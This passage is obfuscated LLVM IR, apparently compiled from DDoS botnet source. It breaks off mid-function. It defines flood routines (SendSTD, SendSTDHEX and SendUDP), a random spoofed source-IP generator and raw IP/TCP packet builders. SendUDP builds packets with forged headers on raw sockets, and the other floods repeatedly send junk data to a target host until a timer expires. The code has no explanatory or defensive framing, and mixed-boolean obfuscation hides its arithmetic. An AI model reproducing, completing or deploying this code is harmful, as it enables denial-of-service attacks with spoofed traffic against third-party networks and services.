}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %5, -1
  %8 = xor i32 %6, -1
  %9 = xor i32 388877917, -1
  %10 = or i32 %7, %8
  %11 = or i32 388877917, %9
  %12 = xor i32 %10, -1
  %13 = and i32 %12, %11
  %14 = and i32 %5, %6
  store i32 %13, i32* %3, align 4
  %15 = load i32, i32* %3, align 4
  %16 = call i32 @rand_cmwc()
  %17 = load i32, i32* %2, align 4
  %18 = xor i32 %17, -1
  %19 = and i32 -1344341686, %18
  %20 = xor i32 -1344341686, -1
  %21 = and i32 %17, %20
  %22 = xor i32 -1, -1
  %23 = and i32 %22, -1344341686
  %24 = and i32 -1, %20
  %25 = or i32 %19, %21
  %26 = or i32 %23, %24
  %27 = xor i32 %25, %26
  %28 = xor i32 %17, -1
  %29 = xor i32 %16, -1
  %30 = xor i32 %27, -1
  %31 = xor i32 1463253502, -1
  %32 = or i32 %29, %30
  %33 = or i32 1463253502, %31
  %34 = xor i32 %32, -1
  %35 = and i32 %34, %33
  %36 = and i32 %16, %27
  %37 = xor i32 %15, -1
  %38 = and i32 %35, %37
  %39 = xor i32 %35, -1
  %40 = and i32 %15, %39
  %41 = or i32 %38, %40
  %42 = xor i32 %15, %35
  ret i32 %41
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %23

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 0, %13
  %16 = sub i64 %14, %15
  %17 = add i64 %14, %13
  store i64 %16, i64* %5, align 8
  %18 = load i32, i32* %4, align 4
  %19 = add i32 %18, -815550348
  %20 = sub i32 %19, 2
  %21 = sub i32 %20, -815550348
  %22 = sub nsw i32 %18, 2
  store i32 %21, i32* %4, align 4
  br label %6

; <label>:23:                                     ; preds = %6
  %24 = load i32, i32* %4, align 4
  %25 = icmp sgt i32 %24, 0
  br i1 %25, label %26, label %37

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %3, align 8
  %28 = bitcast i16* %27 to i8*
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i64
  %31 = load i64, i64* %5, align 8
  %32 = sub i64 0, %31
  %33 = sub i64 0, %30
  %34 = add i64 %32, %33
  %35 = sub i64 0, %34
  %36 = add i64 %31, %30
  store i64 %35, i64* %5, align 8
  br label %37

; <label>:37:                                     ; preds = %26, %23
  br label %38

; <label>:38:                                     ; preds = %42, %37
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = icmp ne i64 %40, 0
  br i1 %41, label %42, label %57

; <label>:42:                                     ; preds = %38
  %43 = load i64, i64* %5, align 8
  %44 = xor i64 %43, -1
  %45 = xor i64 65535, -1
  %46 = xor i64 97582192899820337, -1
  %47 = or i64 %44, %45
  %48 = or i64 97582192899820337, %46
  %49 = xor i64 %47, -1
  %50 = and i64 %49, %48
  %51 = and i64 %43, 65535
  %52 = load i64, i64* %5, align 8
  %53 = lshr i64 %52, 16
  %54 = sub i64 0, %53
  %55 = sub i64 %50, %54
  %56 = add i64 %50, %53
  store i64 %55, i64* %5, align 8
  br label %38

; <label>:57:                                     ; preds = %38
  %58 = load i64, i64* %5, align 8
  %59 = xor i64 %58, -1
  %60 = and i64 -1, %59
  %61 = xor i64 -1, -1
  %62 = and i64 %58, %61
  %63 = or i64 %60, %62
  %64 = xor i64 %58, -1
  %65 = trunc i64 %63 to i16
  ret i16 %65
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #10
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #5
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #5
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 %13, -1
  %15 = xor i8 -16, -1
  %16 = xor i8 -120, -1
  %17 = or i8 %14, %15
  %18 = or i8 -120, %16
  %19 = xor i8 %17, -1
  %20 = and i8 %19, %18
  %21 = and i8 %13, -16
  %22 = xor i8 %20, -1
  %23 = xor i8 5, -1
  %24 = xor i8 -27, -1
  %25 = and i8 %22, -27
  %26 = and i8 %20, %24
  %27 = and i8 %23, -27
  %28 = and i8 5, %24
  %29 = or i8 %25, %26
  %30 = or i8 %27, %28
  %31 = xor i8 %29, %30
  %32 = or i8 %22, %23
  %33 = xor i8 %32, -1
  %34 = or i8 -27, %24
  %35 = and i8 %33, %34
  %36 = or i8 %31, %35
  %37 = or i8 %20, 5
  store i8 %36, i8* %12, align 4
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = bitcast %struct.iphdr* %38 to i8*
  %40 = load i8, i8* %39, align 4
  %41 = xor i8 %40, -1
  %42 = xor i8 15, -1
  %43 = xor i8 -15, -1
  %44 = or i8 %41, %42
  %45 = or i8 -15, %43
  %46 = xor i8 %44, -1
  %47 = and i8 %46, %45
  %48 = and i8 %40, 15
  %49 = xor i8 %47, -1
  %50 = xor i8 64, -1
  %51 = xor i8 45, -1
  %52 = and i8 %49, 45
  %53 = and i8 %47, %51
  %54 = and i8 %50, 45
  %55 = and i8 64, %51
  %56 = or i8 %52, %53
  %57 = or i8 %54, %55
  %58 = xor i8 %56, %57
  %59 = or i8 %49, %50
  %60 = xor i8 %59, -1
  %61 = or i8 45, %51
  %62 = and i8 %60, %61
  %63 = or i8 %58, %62
  %64 = or i8 %47, 64
  store i8 %63, i8* %39, align 4
  %65 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %66 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %65, i32 0, i32 1
  store i8 0, i8* %66, align 1
  %67 = load i32, i32* %10, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 0, %68
  %70 = sub i64 20, %69
  %71 = add i64 20, %68
  %72 = trunc i64 %70 to i16
  %73 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %74 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %73, i32 0, i32 2
  store i16 %72, i16* %74, align 2
  %75 = call i32 @rand_cmwc()
  %76 = trunc i32 %75 to i16
  %77 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %78 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %77, i32 0, i32 3
  store i16 %76, i16* %78, align 4
  %79 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %80 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %79, i32 0, i32 4
  store i16 0, i16* %80, align 2
  %81 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %82 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %81, i32 0, i32 5
  store i8 -1, i8* %82, align 4
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %85 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %84, i32 0, i32 6
  store i8 %83, i8* %85, align 1
  %86 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %87 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %86, i32 0, i32 7
  store i16 0, i16* %87, align 2
  %88 = load i32, i32* %8, align 4
  %89 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %90 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %89, i32 0, i32 8
  store i32 %88, i32* %90, align 4
  %91 = load i32, i32* %7, align 4
  %92 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %93 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %92, i32 0, i32 9
  store i32 %91, i32* %93, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @SendSTDHEX(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [1 x i8*], align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %13 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %13, i32* %7, align 4
  %14 = call i64 @time(i64* null) #5
  store i64 %14, i64* %8, align 8
  %15 = load i8*, i8** %4, align 8
  %16 = call %struct.hostent* @gethostbyname(i8* %15)
  store %struct.hostent* %16, %struct.hostent** %10, align 8
  %17 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = load %struct.hostent*, %struct.hostent** %10, align 8
  %19 = getelementptr inbounds %struct.hostent, %struct.hostent* %18, i32 0, i32 4
  %20 = load i8**, i8*** %19, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %24 = bitcast %struct.in_addr* %23 to i8*
  %25 = load %struct.hostent*, %struct.hostent** %10, align 8
  %26 = getelementptr inbounds %struct.hostent, %struct.hostent* %25, i32 0, i32 3
  %27 = load i32, i32* %26, align 4
  %28 = sext i32 %27 to i64
  call void @bcopy(i8* %22, i8* %24, i64 %28) #5
  %29 = load %struct.hostent*, %struct.hostent** %10, align 8
  %30 = getelementptr inbounds %struct.hostent, %struct.hostent* %29, i32 0, i32 2
  %31 = load i32, i32* %30, align 8
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %32, i16* %33, align 4
  %34 = load i32, i32* %5, align 4
  %35 = trunc i32 %34 to i16
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  store i32 0, i32* %11, align 4
  br label %37

; <label>:37:                                     ; preds = %62, %3
  %38 = bitcast [1 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %38, i8* bitcast ([1 x i8*]* @SendSTDHEX.hexstring to i8*), i64 8, i32 8, i1 false)
  %39 = load i32, i32* %11, align 4
  %40 = icmp uge i32 %39, 50
  br i1 %40, label %41, label %62

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %7, align 4
  %43 = getelementptr inbounds [1 x i8*], [1 x i8*]* %12, i32 0, i32 0
  %44 = bitcast i8** %43 to i8*
  %45 = call i64 @send(i32 %42, i8* %44, i64 1460, i32 0)
  %46 = load i32, i32* %7, align 4
  %47 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %48 = call i32 @connect(i32 %46, %struct.sockaddr* %47, i32 16)
  %49 = call i64 @time(i64* null) #5
  %50 = load i64, i64* %8, align 8
  %51 = load i32, i32* %6, align 4
  %52 = sext i32 %51 to i64
  %53 = add i64 %50, -6040820624607874663
  %54 = add i64 %53, %52
  %55 = sub i64 %54, -6040820624607874663
  %56 = add nsw i64 %50, %52
  %57 = icmp sge i64 %49, %55
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %41
  %59 = load i32, i32* %7, align 4
  %60 = call i32 @close(i32 %59)
  call void @_exit(i32 0) #11
  unreachable

; <label>:61:                                     ; preds = %41
  store i32 0, i32* %11, align 4
  br label %62

; <label>:62:                                     ; preds = %61, %37
  %63 = load i32, i32* %11, align 4
  %64 = sub i32 0, %63
  %65 = sub i32 0, 1
  %66 = add i32 %64, %65
  %67 = sub i32 0, %66
  %68 = add i32 %63, 1
  store i32 %67, i32* %11, align 4
  br label %37
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

declare %struct.hostent* @gethostbyname(i8*) #1

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @SendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i64, align 8
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca i32, align 4
  %12 = alloca [26 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i64 @time(i64* null) #5
  store i64 %15, i64* %8, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call %struct.hostent* @gethostbyname(i8* %16)
  store %struct.hostent* %17, %struct.hostent** %10, align 8
  %18 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 16, i32 4, i1 false)
  %19 = load %struct.hostent*, %struct.hostent** %10, align 8
  %20 = getelementptr inbounds %struct.hostent, %struct.hostent* %19, i32 0, i32 4
  %21 = load i8**, i8*** %20, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %25 = bitcast %struct.in_addr* %24 to i8*
  %26 = load %struct.hostent*, %struct.hostent** %10, align 8
  %27 = getelementptr inbounds %struct.hostent, %struct.hostent* %26, i32 0, i32 3
  %28 = load i32, i32* %27, align 4
  %29 = sext i32 %28 to i64
  call void @bcopy(i8* %23, i8* %25, i64 %29) #5
  %30 = load %struct.hostent*, %struct.hostent** %10, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 2
  %32 = load i32, i32* %31, align 8
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %33, i16* %34, align 4
  %35 = load i32, i32* %5, align 4
  %36 = trunc i32 %35 to i16
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %36, i16* %37, align 2
  store i32 0, i32* %11, align 4
  br label %38

; <label>:38:                                     ; preds = %68, %3
  %39 = bitcast [26 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %39, i8* bitcast ([26 x i8*]* @SendSTD.randstrings to i8*), i64 208, i32 16, i1 false)
  %40 = call i32 @rand() #5
  %41 = sext i32 %40 to i64
  %42 = urem i64 %41, 26
  %43 = getelementptr inbounds [26 x i8*], [26 x i8*]* %12, i64 0, i64 %42
  %44 = load i8*, i8** %43, align 8
  store i8* %44, i8** %13, align 8
  %45 = load i32, i32* %11, align 4
  %46 = icmp uge i32 %45, 50
  br i1 %46, label %47, label %68

; <label>:47:                                     ; preds = %38
  %48 = load i32, i32* %7, align 4
  %49 = load i8*, i8** %13, align 8
  %50 = call i64 @send(i32 %48, i8* %49, i64 69, i32 0)
  %51 = load i32, i32* %7, align 4
  %52 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %51, %struct.sockaddr* %52, i32 16)
  %54 = call i64 @time(i64* null) #5
  %55 = load i64, i64* %8, align 8
  %56 = load i32, i32* %6, align 4
  %57 = sext i32 %56 to i64
  %58 = sub i64 0, %55
  %59 = sub i64 0, %57
  %60 = add i64 %58, %59
  %61 = sub i64 0, %60
  %62 = add nsw i64 %55, %57
  %63 = icmp sge i64 %54, %61
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %47
  %65 = load i32, i32* %7, align 4
  %66 = call i32 @close(i32 %65)
  call void @_exit(i32 0) #11
  unreachable

; <label>:67:                                     ; preds = %47
  store i32 0, i32* %11, align 4
  br label %68

; <label>:68:                                     ; preds = %67, %38
  %69 = load i32, i32* %11, align 4
  %70 = sub i32 %69, 2088591198
  %71 = add i32 %70, 1
  %72 = add i32 %71, 2088591198
  %73 = add i32 %69, 1
  store i32 %72, i32* %11, align 4
  br label %38
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: noinline nounwind uwtable
define void @SendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = load i32, i32* %8, align 4
  %26 = icmp eq i32 %25, 0
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %6
  %28 = call i32 @rand_cmwc()
  %29 = trunc i32 %28 to i16
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %29, i16* %30, align 2
  br label %36

; <label>:31:                                     ; preds = %6
  %32 = load i32, i32* %8, align 4
  %33 = trunc i32 %32 to i16
  %34 = call zeroext i16 @htons(i16 zeroext %33) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  br label %36

; <label>:36:                                     ; preds = %31, %27
  %37 = load i8*, i8** %7, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %39 = call i32 @getHost(i8* %37, %struct.in_addr* %38)
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %36
  br label %238

; <label>:42:                                     ; preds = %36
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %44 = getelementptr inbounds [8 x i8], [8 x i8]* %43, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 8, i32 4, i1 false)
  %45 = load i32, i32* %11, align 4
  store i32 %45, i32* %14, align 4
  %46 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %46, i32* %15, align 4
  %47 = load i32, i32* %15, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  br label %238

; <label>:50:                                     ; preds = %42
  store i32 1, i32* %16, align 4
  %51 = load i32, i32* %15, align 4
  %52 = bitcast i32* %16 to i8*
  %53 = call i32 @setsockopt(i32 %51, i32 0, i32 3, i8* %52, i32 4) #5
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %50
  br label %238

; <label>:56:                                     ; preds = %50
  store i32 50, i32* %17, align 4
  br label %57

; <label>:57:                                     ; preds = %65, %56
  %58 = load i32, i32* %17, align 4
  %59 = sub i32 0, %58
  %60 = sub i32 0, -1
  %61 = add i32 %59, %60
  %62 = sub i32 0, %61
  %63 = add nsw i32 %58, -1
  store i32 %62, i32* %17, align 4
  %64 = icmp ne i32 %58, 0
  br i1 %64, label %65, label %77

; <label>:65:                                     ; preds = %57
  %66 = call i64 @time(i64* null) #5
  %67 = call i32 @rand_cmwc()
  %68 = zext i32 %67 to i64
  %69 = xor i64 %66, -1
  %70 = and i64 %68, %69
  %71 = xor i64 %68, -1
  %72 = and i64 %66, %71
  %73 = or i64 %70, %72
  %74 = xor i64 %66, %68
  %75 = trunc i64 %73 to i32
  call void @srand(i32 %75) #5
  %76 = call i32 @rand() #5
  call void @init_rand(i32 %76)
  br label %57

; <label>:77:                                     ; preds = %57
  %78 = load i32, i32* %12, align 4
  %79 = sub i32 0, %78
  %80 = add i32 32, %79
  %81 = sub nsw i32 32, %78
  %82 = shl i32 1, %80
  %83 = sub i32 %82, -857139120
  %84 = sub i32 %83, 1
  %85 = add i32 %84, -857139120
  %86 = sub nsw i32 %82, 1
  %87 = xor i32 %85, -1
  %88 = and i32 -1, %87
  %89 = xor i32 -1, -1
  %90 = and i32 %85, %89
  %91 = or i32 %88, %90
  %92 = xor i32 %85, -1
  store i32 %91, i32* %18, align 4
  %93 = load i32, i32* %10, align 4
  %94 = sext i32 %93 to i64
  %95 = sub i64 0, %94
  %96 = sub i64 28, %95
  %97 = add i64 28, %94
  %98 = call i8* @llvm.stacksave()
  store i8* %98, i8** %19, align 8
  %99 = alloca i8, i64 %96, align 16
  %100 = bitcast i8* %99 to %struct.iphdr*
  store %struct.iphdr* %100, %struct.iphdr** %20, align 8
  %101 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %102 = bitcast %struct.iphdr* %101 to i8*
  %103 = getelementptr i8, i8* %102, i64 20
  %104 = bitcast i8* %103 to %struct.udphdr*
  store %struct.udphdr* %104, %struct.udphdr** %21, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 4
  %109 = load i32, i32* %18, align 4
  %110 = call i32 @getRandomIP(i32 %109)
  %111 = call i32 @htonl(i32 %110) #10
  %112 = load i32, i32* %10, align 4
  %113 = sext i32 %112 to i64
  %114 = sub i64 0, %113
  %115 = sub i64 8, %114
  %116 = add i64 8, %113
  %117 = trunc i64 %115 to i32
  call void @makeIPPacket(%struct.iphdr* %105, i32 %108, i32 %111, i8 zeroext 17, i32 %117)
  %118 = load i32, i32* %10, align 4
  %119 = sext i32 %118 to i64
  %120 = sub i64 8, 5462660012422413009
  %121 = add i64 %120, %119
  %122 = add i64 %121, 5462660012422413009
  %123 = add i64 8, %119
  %124 = trunc i64 %122 to i16
  %125 = call zeroext i16 @htons(i16 zeroext %124) #10
  %126 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %127 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %126, i32 0, i32 0
  %128 = bitcast %union.anon.1* %127 to %struct.anon.2*
  %129 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %128, i32 0, i32 2
  store i16 %125, i16* %129, align 2
  %130 = call i32 @rand_cmwc()
  %131 = trunc i32 %130 to i16
  %132 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %133 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %132, i32 0, i32 0
  %134 = bitcast %union.anon.1* %133 to %struct.anon.2*
  %135 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %134, i32 0, i32 0
  store i16 %131, i16* %135, align 2
  %136 = load i32, i32* %8, align 4
  %137 = icmp eq i32 %136, 0
  br i1 %137, label %138, label %140

; <label>:138:                                    ; preds = %77
  %139 = call i32 @rand_cmwc()
  br label %145

; <label>:140:                                    ; preds = %77
  %141 = load i32, i32* %8, align 4
  %142 = trunc i32 %141 to i16
  %143 = call zeroext i16 @htons(i16 zeroext %142) #10
  %144 = zext i16 %143 to i32
  br label %145

; <label>:145:                                    ; preds = %140, %138
  %146 = phi i32 [ %139, %138 ], [ %144, %140 ]
  %147 = trunc i32 %146 to i16
  %148 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %149 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon.1* %149 to %struct.anon.2*
  %151 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %150, i32 0, i32 1
  store i16 %147, i16* %151, align 2
  %152 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %153 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %152, i32 0, i32 0
  %154 = bitcast %union.anon.1* %153 to %struct.anon.2*
  %155 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %154, i32 0, i32 3
  store i16 0, i16* %155, align 2
  %156 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %157 = bitcast %struct.udphdr* %156 to i8*
  %158 = getelementptr inbounds i8, i8* %157, i64 8
  %159 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %158, i32 %159)
